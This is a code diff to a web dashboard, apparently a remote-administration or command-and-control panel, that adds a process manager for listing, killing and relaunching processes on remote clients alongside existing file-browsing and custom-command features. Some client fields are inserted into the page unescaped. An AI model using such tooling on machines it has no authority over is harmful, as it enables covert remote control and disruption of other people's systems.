@@ -368,6 +368,23 @@
         </div>
     </div>
 
+    <!-- Process Manager Modal -->
+    <div class="modal" id="processManagerModal">
+        <div class="modal-content" style="max-width: 1200px; max-height: 90vh;">
+            <h2>⚙️ Process Manager</h2>
+
+            <div style="margin-bottom: 20px; display: flex; gap: 10px; align-items: center;">
+                <input type="text" id="processSearch" placeholder="Search processes..." style="flex: 1; padding: 8px; background: #0d1117; border: 1px solid #30363d; border-radius: 5px; color: #c9d1d9;" oninput="filterProcesses()" />
+                <button onclick="refreshProcessList()" style="padding: 8px 16px;">🔄 Refresh</button>
+                <button onclick="closeProcessManager()" class="button-secondary" style="padding: 8px 16px;">Close</button>
+            </div>
+
+            <div id="processList" style="max-height: 500px; overflow-y: auto; background: #0d1117; border: 1px solid #30363d; border-radius: 5px;">
+                <div class="no-clients loading">Loading processes...</div>
+            </div>
+        </div>
+    </div>
+
     <!-- Command Modal -->
     <div class="modal" id="commandModal">
         <div class="modal-content">
@@ -435,7 +452,7 @@
                 clientsList.innerHTML = data.clients.map(client => `
                     <div class="client-card ${client.is_online ? 'online' : 'offline'}">
                         <div class="client-info">
-                            <h3>${client.hostname}</h3>
+                            <h3 style="cursor: pointer;" onclick="window.location.href='client_detail.html?id=${client.client_id}'" title="Click to view details">${client.hostname} →</h3>
                             <p style="color: #888; font-size: 12px; font-family: monospace;">${client.client_id}</p>
                             <p><strong>IP:</strong> ${client.local_ip}</p>
                             <p><strong>Platform:</strong> ${client.platform} ${client.platform_release}</p>
@@ -456,6 +473,9 @@
                                 </button>
                                 <button onclick="openFileBrowser('${client.client_id}')" ${!client.is_online ? 'disabled' : ''}>
                                     📁 Files
+                                </button>
+                                <button onclick="openProcessManager('${client.client_id}')" ${!client.is_online ? 'disabled' : ''}>
+                                    ⚙️ Processes
                                 </button>
                                 <button onclick="openCommandModal('${client.client_id}')" ${!client.is_online ? 'disabled' : ''}>
                                     💻 Custom
@@ -1022,6 +1042,173 @@ for item in sorted(os.listdir(cwd))[:50]:
                 '\\': '\\\\'
             };
             return text.replace(/[&<>"'\\]/g, m => map[m]);
+        }
+
+        // Process Manager variables
+        let currentProcessManagerClientId = null;
+        let allProcesses = [];
+        let processRefreshInterval = null;
+
+        // Open process manager
+        async function openProcessManager(clientId) {
+            currentProcessManagerClientId = clientId;
+            document.getElementById('processManagerModal').classList.add('active');
+            document.getElementById('processSearch').value = '';
+            await loadProcessList();
+
+            // Auto-refresh every 5 seconds
+            if (processRefreshInterval) clearInterval(processRefreshInterval);
+            processRefreshInterval = setInterval(() => loadProcessList(), 5000);
+        }
+
+        // Close process manager
+        function closeProcessManager() {
+            document.getElementById('processManagerModal').classList.remove('active');
+            currentProcessManagerClientId = null;
+            if (processRefreshInterval) {
+                clearInterval(processRefreshInterval);
+                processRefreshInterval = null;
+            }
+        }
+
+        // Load process list
+        async function loadProcessList() {
+            if (!currentProcessManagerClientId) return;
+
+            try {
+                const response = await fetch('/api/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        client_id: currentProcessManagerClientId,
+                        command: 'list_processes',
+                        params: { sort_by: 'memory', limit: 100 }
+                    })
+                });
+
+                const result = await response.json();
+                const commandId = result.command_id;
+
+                // Poll for result
+                setTimeout(() => pollCommandResult(commandId, displayProcessList), 1000);
+            } catch (error) {
+                console.error('Failed to load processes:', error);
+            }
+        }
+
+        // Display process list
+        function displayProcessList(result) {
+            if (result.status === 'error') {
+                document.getElementById('processList').innerHTML = `<div class="no-clients" style="color: #ff3b3b;">Error: ${result.message}</div>`;
+                return;
+            }
+
+            allProcesses = result.processes || [];
+            filterProcesses();
+        }
+
+        // Filter processes based on search
+        function filterProcesses() {
+            const searchTerm = document.getElementById('processSearch').value.toLowerCase();
+            const filtered = searchTerm
+                ? allProcesses.filter(p =>
+                    p.name.toLowerCase().includes(searchTerm) ||
+                    p.cmdline.toLowerCase().includes(searchTerm)
+                  )
+                : allProcesses;
+
+            if (filtered.length === 0) {
+                document.getElementById('processList').innerHTML = '<div class="no-clients">No processes found</div>';
+                return;
+            }
+
+            const processHtml = `
+                <table style="width: 100%; border-collapse: collapse;">
+                    <thead>
+                        <tr style="background: #161b22; border-bottom: 2px solid #30363d;">
+                            <th style="padding: 10px; text-align: left;">PID</th>
+                            <th style="padding: 10px; text-align: left;">Name</th>
+                            <th style="padding: 10px; text-align: right;">Memory %</th>
+                            <th style="padding: 10px; text-align: right;">CPU %</th>
+                            <th style="padding: 10px; text-align: center;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${filtered.map(proc => `
+                            <tr style="border-bottom: 1px solid #30363d;" onmouseover="this.style.background='#161b22'" onmouseout="this.style.background='transparent'">
+                                <td style="padding: 8px;">${proc.pid}</td>
+                                <td style="padding: 8px;">
+                                    <div style="font-weight: bold;">${escapeHtml(proc.name)}</div>
+                                    <div style="font-size: 11px; color: #888; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 400px;" title="${escapeHtml(proc.cmdline)}">${escapeHtml(proc.cmdline)}</div>
+                                </td>
+                                <td style="padding: 8px; text-align: right;">${proc.memory_percent}%</td>
+                                <td style="padding: 8px; text-align: right;">${proc.cpu_percent}%</td>
+                                <td style="padding: 8px; text-align: center;">
+                                    <button onclick="killProcess(${proc.pid}, '${escapeHtml(proc.name)}')" style="padding: 4px 8px; font-size: 12px; margin-right: 5px;">☠️ Kill</button>
+                                    <button onclick="duplicateProcess(${proc.pid}, '${escapeHtml(proc.name)}')" style="padding: 4px 8px; font-size: 12px;">📋 Duplicate</button>
+                                </td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+            `;
+
+            document.getElementById('processList').innerHTML = processHtml;
+        }
+
+        // Refresh process list
+        function refreshProcessList() {
+            loadProcessList();
+        }
+
+        // Kill process
+        async function killProcess(pid, name) {
+            if (!confirm(`Kill process ${name} (PID: ${pid})?`)) return;
+
+            try {
+                const response = await fetch('/api/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        client_id: currentProcessManagerClientId,
+                        command: 'kill_process',
+                        params: { pid: pid }
+                    })
+                });
+
+                const result = await response.json();
+                alert(`Kill command sent! Command ID: ${result.command_id}`);
+
+                // Refresh list after 2 seconds
+                setTimeout(() => loadProcessList(), 2000);
+            } catch (error) {
+                alert('Failed to kill process: ' + error.message);
+            }
+        }
+
+        // Duplicate process
+        async function duplicateProcess(pid, name) {
+            if (!confirm(`Launch another instance of ${name}?`)) return;
+
+            try {
+                const response = await fetch('/api/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        client_id: currentProcessManagerClientId,
+                        command: 'duplicate_process',
+                        params: { pid: pid }
+                    })
+                });
+
+                const result = await response.json();
+                alert(`Duplicate command sent! Command ID: ${result.command_id}`);
+
+                // Refresh list after 2 seconds
+                setTimeout(() => loadProcessList(), 2000);
+            } catch (error) {
+                alert('Failed to duplicate process: ' + error.message);
+            }
         }
 
         // Auto-refresh data
